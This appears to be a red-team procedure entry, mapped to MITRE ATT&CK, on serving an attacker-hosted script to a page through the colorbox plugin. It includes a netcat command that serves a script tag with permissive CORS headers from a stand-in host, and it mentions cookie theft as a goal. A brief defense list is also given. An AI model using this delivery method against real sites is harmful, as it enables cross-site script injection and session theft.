---
id: proc-004
tags:
  - payload-delivery
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:31.322Z'
skill_level: intermediate
impact_level: medium
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Serve-Malicious-Payload-from-Attacker-Server

## Summary

This procedure sets up an attacker server to deliver a malicious script when loaded by the colorbox plugin.

## Description

The server responds with a script tag containing arbitrary JS, such as alert(document.domain) for testing, or more malicious code for cookie theft. Include CORS headers to allow cross-origin insertion. Use port 9999 as in the example.

## Requirements

1. Control over a public server (e.g., attacker.com)
2. Ability to host HTTP responses
3. Port 9999 open

## Defense

Defensive measures and detection strategies:

- Implement strict CSP to prevent external script loading
- Monitor for unexpected outbound requests from plugins
- Use X-Frame-Options and similar headers

## Objectives

1. Deliver executable script
2. Ensure CORS compatibility
3. Enable DOM insertion

## Instructions

### Step 1: Configure Server Response

**Context**: Set up the server to return the payload with appropriate headers.

**Command**:
```bash
# Example using netcat or similar: echo -e "HTTP/1.1 200 OK\r\nContent-Length: 39\r\nAccess-Control-Allow-Origin: *\r\nAccess-Control-Allow-Headers: x-requested-with\r\n\r\n<script>alert(document.domain)</script>" | nc -l 9999
```

> When colorbox fetches from attacker.com:9999, it receives and inserts the script.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[payload-delivery]]
- [[JavaScript]]
